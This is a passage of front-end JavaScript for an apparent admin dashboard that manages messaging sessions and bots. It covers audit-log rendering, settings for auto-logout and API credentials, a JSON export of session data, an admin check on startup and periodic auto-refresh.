      ? rows.map(r => `<div class="audit-row"><div class="ts">${fmtTs(r.ts)}</div><div class="act">${r.action}</div><div class="det">${r.phone || '—'} ${r.detail || ''}</div></div>`).join('')
      : `<div class="empty"><i data-lucide="inbox"></i><div>No activity yet.</div></div>`;
    renderIcons();
  } catch (e) { toast(e.message, 'err'); }
}

/* ---------- settings ---------- */
async function loadSettings() {
  try {
    const s = await api('/api/settings');
    $('#set-al').checked = s.auto_logout_enabled;
    $('#set-hours').value = s.auto_logout_hours;
    $('#set-api-id').value = s.api_id || '';
    $('#set-api-hash').value = s.api_hash || '';
    $('#set-bot-token').value = s.bot_token || '';
    $('#set-log-channel').value = s.log_channel_id || '';
    renderIcons();
  } catch (e) { toast(e.message, 'err'); }
}

$('#btn-save-settings').onclick = async () => {
  try {
    const body = {
      auto_logout_enabled: $('#set-al').checked,
      auto_logout_hours: +$('#set-hours').value,
      api_id: $('#set-api-id').value,
      api_hash: $('#set-api-hash').value,
      bot_token: $('#set-bot-token').value,
      log_channel_id: $('#set-log-channel').value,
    };
    if ($('#set-pw').value) body.admin_password = $('#set-pw').value;
    await api('/api/settings', { method: 'POST', body: JSON.stringify(body) });
    toast('Saved', 'ok');
    $('#set-pw').value = '';
  } catch (e) { toast(e.message, 'err'); }
};

$('#btn-export').onclick = async () => {
  try {
    const data = await api('/api/export');
    const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = `manager-sessions-${Date.now()}.json`;
    a.click();
    toast('Exported', 'ok');
  } catch (e) { toast(e.message, 'err'); }
};

/* ---------- init ---------- */
(async function init() {
  renderIcons();
  const me = await api('/api/me').catch(() => ({ admin: false }));
  if (!me.admin) location.href = '/';
  else switchView('dashboard');
})();

// auto refresh
setInterval(() => {
  const v = $('.nav-item.active')?.dataset.view;
  if (v === 'dashboard') loadDashboard();
  else if (v === 'sessions') loadSessions();
  else if (v === 'bots') loadBots();
}, 30000);
